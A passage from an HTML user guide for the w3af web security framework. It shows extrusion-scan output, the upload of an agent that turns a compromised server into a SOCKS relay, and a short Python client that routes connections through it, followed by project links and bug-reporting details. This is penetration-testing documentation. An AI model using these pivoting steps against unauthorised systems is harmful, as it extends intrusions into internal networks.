run w3af as a normal user, the reason is simple, when you run w3af as a user you can't sniff and therefor can't perform a successful extrusion scan. A successful extrusion scan would look like: </p><p class="P12"> </p><p class="P65">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P65">ExtrusionServer listening on interface: eth1 </p><p class="P65">Finished extrusion scan.  </p><p class="P65">The remote host: "172.10.10.1" can connect to w3af with these ports:  </p><p class="P65">- 25/TCP  </p><p class="P65">- 80/TCP  </p><p class="P65">- 53/TCP  </p><p class="P65">- 1433/TCP  </p><p class="P65">- 8080/TCP  </p><p class="P65">- 53/UDP  </p><p class="P65">- 69/UDP  </p><p class="P65">- 139/UDP  </p><p class="P65">- 1025/UDP  </p><p class="P65">The following ports are not bound to a local process and can be used by w3af: </p><p class="P65">- 25/TCP  </p><p class="P65">- 53/TCP  </p><p class="P65">- 1433/TCP  </p><p class="P65">- 8080/TCP  </p><p class="P65">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.  </p><p class="P65"> </p><p class="P12">In both cases (superuser and user), these should be the following steps: </p><p class="P65"> </p><p class="P65">Starting w3afAgentClient upload.  </p><p class="P65">Finished w3afAgentClient upload.  </p><p class="P65">Please wait 30 seconds for w3afAgentClient execution.  </p><p class="P65">w3afAgent service is up and running.  </p><p class="P65">You may start using the w3afAgent that is listening on port 1080. All connections made through this SOCKS daemon will be relayed using the compromised server.  </p><p class="P65"> </p><p class="P12">And now, from another console we can use a socksClient to route connections through the compromised server: </p><p class="P12"> </p><p class="P65"><span class="T1">$</span> nc <span class="T7">172.10.10.1 22</span></p><p class="P65">(UNKNOWN) [172.10.10.1] 22 (ssh) : Connection refused  </p><p class="P65"> </p><p class="P65"><span class="T1">$</span> python socksClient.py 127.0.0.1 22</p><p class="P65">SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1  </p><p class="P65">Protocol mismatch.  </p><p class="P65"> </p><p class="P65"><span class="T1">$</span> cat socksClient.py</p><p class="P65">import extlib.socksipy.socks as socks  </p><p class="P65">import sys  </p><p class="P65"> </p><p class="P65">s = socks.socksocket()  </p><p class="P65">s.setproxy(socks.PROXY_TYPE_SOCKS4,"localhost")  </p><p class="P65">s.connect((sys.argv[1],int(sys.argv[2])))  </p><p class="P65"> </p><p class="P65">s.send('\n') </p><p class="P65">print s.recv(1024)  </p><p class="P65"> </p><p class="P40"> </p><h2 class="P74"><a name="More_information" />More information</h2><p class="P23"> </p><p class="P23">More information about the framework, like: HOWTOs, advanced usage, bugs, TODO list and news, can be found in the project homepage: </p><p class="P63"><a href="http://w3af.sf.net/">http://w3af.sf.net/</a></p><p class="P23"> </p><p class="P23">The w3af project has two mailing lists, one for developers and one for users. If you have any question or comment about the framework, don't hesitate and send an email to any of the mailing lists, which can be located at: </p><p class="P63"><a href="http://sourceforge.net/mail/?group_id=170274">http://sourceforge.net/mail/?group_id=170274</a></p><p class="P33"> </p><h2 class="Heading2"><a name="Bugs" />Bugs</h2><p class="Textbody"> </p><p class="P9">The framework is still under development and has <span class="T5">many</span> known bugs. <span class="T12">If you downloaded the latest release package and find a bug, please perform a SVN checkout and try to reproduce the bug in the latest version, if you are still able to reproduce it, please report the bug with a detailed description. To report a bug please navigate to:</span></p><p class="P68"><a href="http://sourceforge.net/tracker/?group_id=170274&amp;atid=853652">http://sourceforge.net/tracker/?group_id=170274&amp;atid=853652</a></p><p class="P68"> </p><h2 class="P74"><a name="Contributors" />Contributors</h2><p class="P9">Code contributions are always welcome, a plugin developer guide will be written shortly to aid new developers enter the w3af world. For a list of known bugs and a TODO list, please see: </p><p class="P9"> </p><p class="P64"><a href="http://sourceforge.net/pm/?group_id=170274">http://sourceforge.net/pm/?group_id=170274</a></p><p class="P64"> </p><h2 class="P42"><a name="Final_words" />Final words</h2><p class="Textbody"> </p><p class="P9">This document is merely an introduction, complete knowledge about the framework and its usage is complex and can be achieved only by using it.</p><p class="P9"> </p><p class="P9">Making a mistake and learning from it takes you one step closer to wisdom.</p></body></html>